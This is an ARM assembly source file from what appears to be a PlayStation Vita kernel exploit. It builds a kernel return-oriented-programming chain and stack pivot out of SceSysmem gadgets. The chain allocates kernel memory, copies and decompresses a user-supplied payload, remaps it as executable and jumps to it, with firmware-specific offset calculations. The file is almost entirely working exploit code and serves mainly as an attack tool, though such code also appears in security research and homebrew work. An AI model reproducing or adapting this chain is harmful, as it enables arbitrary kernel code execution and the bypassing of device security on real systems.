/* krop.S -- kernel rop chain
 *
 * Copyright (C) 2018 TheFloW
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

#include "koffsets.S"

// Variables that lie in the kernel stack
.equ payload_temp_block,   0x00
.equ payload_temp_blockid, 0x04
.equ payload_code_block,   0x08
.equ payload_code_blockid, 0x0C

// Max decompressed payload size; Currently 1 MB, must be a multiple of 4096 bytes!
.equ MAX_PAYLOAD_DECOMPRESSED_SIZE, 0x100000

.macro init_krop dst
  .set krop_chain, \dst
.endm

.macro push base, gadget
  .if \base == 0
    store_vv \gadget, krop_chain
  .elseif \base == 1
    load_add_store krop_chain, sysmem_base, \gadget
  .elseif \base == 2
    load_add_store krop_chain, kstack_base, \gadget
  .elseif \base == 9
    // Dummy
  .endif
  .set krop_chain, krop_chain + 4
.endm

.macro build_krop dst
  // Init krop chain
  init_krop \dst

  // Allocate temporary block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
  push 1, SceSysmem_empty_string                       // r0
  push 0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RW           // r1
  push 0, (payload_size + 0xFFF) & ~0xFFF              // r2
  push 0, NULL                                         // r3
  push 1, SceSysmem_sceKernelAllocMemBlockForKernel    // r4
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // pc
  push 2, payload_temp_blockid                         // r4
  push 1, SceSysmem_str_r0_r4_movs_r0_0_pop_r4_pc      // pc
  push 9, 0xDEADBEEF                                   // r4

  // Get temporary block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
  push 2, payload_temp_blockid                         // r0
  push 2, payload_temp_block                           // r1
  push 9, 0xDEADBEEF                                   // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // r3
  push 1, SceSysmem_sceKernelGetMemBlockBase           // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
  push 9, 0xDEADBEEF                                   // r4

  // Allocate code block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
  push 1, SceSysmem_empty_string                       // r0
  push 0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RW           // r1
  push 0, MAX_PAYLOAD_DECOMPRESSED_SIZE                // r2
  push 0, NULL                                         // r3
  push 1, SceSysmem_sceKernelAllocMemBlockForKernel    // r4
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // pc
  push 2, payload_code_blockid                         // r4
  push 1, SceSysmem_str_r0_r4_movs_r0_0_pop_r4_pc      // pc
  push 9, 0xDEADBEEF                                   // r4

  // Get code block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
  push 2, payload_code_blockid                         // r0
  push 2, payload_code_block                           // r1
  push 9, 0xDEADBEEF                                   // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // r3
  push 1, SceSysmem_sceKernelGetMemBlockBase           // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
  push 9, 0xDEADBEEF                                   // r4

  // Copy compressed payload from user to temporary block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
  push 2, payload_temp_block                           // r0
  push 0, payload_start                                // r1
  push 0, payload_size                                 // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // r3
  push 1, SceSysmem_sceKernelCopyFromUser              // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
  push 9, 0xDEADBEEF                                   // r4

  // Decompress payload to code block
  push 1, SceSysmem_pop_r3_r4_r5_pc                    // pc
  push 1, SceSysmem_pop_pc                             // r3
  push 1, SceSysmem_sceDeflateDecompress               // r4
  push 2, payload_temp_block - 0x14                    // r5
  push 1, SceSysmem_ldr_r2_r5_14_blx_r3                // pc
  push 1, SceSysmem_pop_r0_r1_pc                       // pc
  push 2, payload_code_block                           // r0
  push 0, MAX_PAYLOAD_DECOMPRESSED_SIZE                // r1
  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
  push 1, SceSysmem_pop_r3_pc                          // pc
  push 0, NULL                                         // r3
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // pc
  push 9, 0xDEADBEEF                                   // r4

  // Free temporary block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
  push 2, payload_temp_blockid                         // r0
  push 9, 0xDEADBEEF                                   // r1
  push 9, 0xDEADBEEF                                   // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // r3
  push 1, SceSysmem_sceKernelFreeMemBlock              // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
  push 9, 0xDEADBEEF                                   // r4

  // Mark code block as executable
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
  push 2, payload_code_blockid                         // r0
  push 0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RX           // r1
  push 9, 0xDEADBEEF                                   // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // r3
  push 1, SceSysmem_sceKernelRemapMemBlock             // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
  push 9, 0xDEADBEEF                                   // r4

  // Clean cache
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
  push 2, payload_code_block                           // r0
  push 0, MAX_PAYLOAD_DECOMPRESSED_SIZE                // r1
  push 9, 0xDEADBEEF                                   // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // r3
  push 1, SceSysmem_sceKernelDcacheCleanRangeForL1WBWA // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
  push 9, 0xDEADBEEF                                   // r4

  // Execute payload
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
  push 2, payload_code_block                           // r0
  push 1, 0                                            // r1
  push 0, framebuf                                     // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // r3
  push 1, SceSysmem_adds_r0_1_bx_lr                    // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
  push 9, 0xDEADBEEF                                   // r4
  push 1, SceSysmem_blx_r0                             // pc
.endm

//
// PC is now:
// pop {r3, r4, r5, r6, r7, pc}
//
// Results:
// r3 = SceSysmem_pop_r3_pc
// r4 = SceSysmem_sub_r1_r1_r3_bx_lr
// r5 = WHATEVER.
// r6 = SceSysmem_pop_pc
// r7 = WHATEVER.
//
// PC is now:
// add r1, sp, #0xBC
// mov r2, r6
// mov r0, r5 @ Not important
// blx r3
//
// Results:
// r0 = WHATEVER.
// r1 = SP + 0xBC
// r2 = SceSysmem_pop_pc
//
// PC is now:
// pop {r3, pc}
//
// Results:
// r3 = 0x1C + 0xBC + difference @ Location of code to execute will be put here somehow.
// difference is 0x8A4 (on 3.50 - 3.74)
// In other words, r3 = 0x97C
//
// PC is now:
// blx r4
// pop {r4, pc}
//
// Results:
// r4 = WHATEVER.
//
// PC is now:
// mov sp, r1 @ Calculated previously
// blx r2     @ SceSysmem_pop_pc
//
// Results:
// We jump to krop_buf, it must be the next byte on stack.

// 0x1C is how many bytes the ROP chain has used so far.
// 0xBC comes from the instruction.
#if (FW != 318 && FW != 330)
.macro build_pivot_krop dst
  // Init krop chain
  init_krop \dst

  @ KSTACK_BASE = 0x0245D000
  @ SP = 0x0245DFA0

  @ KERNEL_STACK = 0x1000
  @ 0x1000 - 0xFA0 = 0x60
  @ OVERWRITE_SIZE is = 0x64...
  @ Hm...

  @ Here SP = BASE + 0xFA0

  // Kernel stack pivot
  .set difference, (KSTACK_SIZE - OVERWRITE_SIZE) - KSTACK_DEVCTL_INDATA_OFFSET
  /* 0x00 */ push 1, SceSysmem_pop_r3_r4_r5_r6_r7_pc              // pc
  /* 0x04 */ push 1, SceSysmem_pop_r3_pc                          // r3
  /* 0x08 */ push 1, SceSysmem_sub_r1_r1_r3_bx_lr                 // r4
  /* 0x0C */ push 9, 0xDEADBEEF                                   // r5
  /* 0x10 */ push 1, SceSysmem_pop_pc                             // r6
  /* 0x14 */ push 9, 0xDEADBEEF                                   // r7

  /* 0x18 */ push 1, SceSysmem_add_r1_sp_bc_mov_r2_r6_blx_r3      // pc
  /* 0x1C */ push 0, 0x1C + 0xBC + difference                     // r3

  @ Here SP = BASE + 0xFC0

  /* 0x20 */ push 1, SceSysmem_blx_r4_pop_r4_pc                   // pc
  /* 0x24 */ push 9, 0xDEADBEEF                                   // r4

  @ difference = 0x8A4
  @ 0x1C + 0xBC + 0x8A4 = 0x97C
  @ 0x97C - 0xBC = 0x8C0

  @ Here SP = BASE + 0xFC8
  @ 0xFC8 - 0x8C0 = KSTACK_DEVCTL_INDATA_OFFSET (0x6F8)

  /* 0x28 */ push 1, SceSysmem_mov_sp_r1_blx_r2                   // pc

  @ ?Here SP = BASE + 0xFCC?
  @ ...but we will never get here...

  @ End result:
  @ Kernel stack begins at 0x024AB000
  @ SP = 0x024AB6F8
  @ 0x6F8 = KSTACK_DEVCTL_INDATA_OFFSET
  @
  @ Effectively sets SP to KSTACK_BASE + KSTACK_DEVCTL_INDATA_OFFSET
.endm
#else
.macro build_pivot_krop dst
  // Init krop chain
  init_krop \dst

  @ Here SP = BASE + 0xFA0

  // Kernel stack pivot
  .set difference, (KSTACK_SIZE - OVERWRITE_SIZE) - KSTACK_DEVCTL_INDATA_OFFSET
  /* 0x00 */ push 1, SceSysmem_pop_r3_pc                          // pc
  /* 0x04 */ push 1, SceSysmem_pop_r3_pc                          // r3

  /* 0x08 */ push 1, SceSysmem_pop_r4_r5_r6_r7_r8_pc              // pc
  /* 0x0C */ push 1, SceSysmem_sub_r1_r1_r3_bx_lr                 // r4
  /* 0x10 */ push 9, 0xDEADBEEF                                   // r5
  /* 0x14 */ push 9, 0xDEADBEEF                                   // r6
  /* 0x18 */ push 9, 0xDEADBEEF                                   // r7
  /* 0x1C */ push 1, SceSysmem_pop_pc                             // r8

  @ Here SP = BASE + 0xFC0

  /* 0x20 */ push 1, SceSysmem_add_r1_sp_c4_mov_r2_r8_blx_r3      // pc
  /* 0x24 */ push 0, 0x24 + 0xC4 + difference                     // r3

  @ r3 = 0x984

  @ Here SP = BASE + 0xFC8

  /* 0x28 */ push 1, SceSysmem_blx_r4_pop_r4_pc                   // pc
  /* 0x2C */ push 9, 0xDEADBEEF                                   // r4

  @ Here SP = BASE + 0xFD0
  /* 0x30 */ push 1, SceSysmem_mov_sp_r1_blx_r2                   // pc

  @ ?Here SP = BASE + 0xFD4?
  @ ...but we will never get here...

  @ difference = 0x89C
  @ 0x24 + 0xC4 + 0x89C = 0x984
  @ 0x984 - 0xC4 = 0x8C0
.endm
#endif
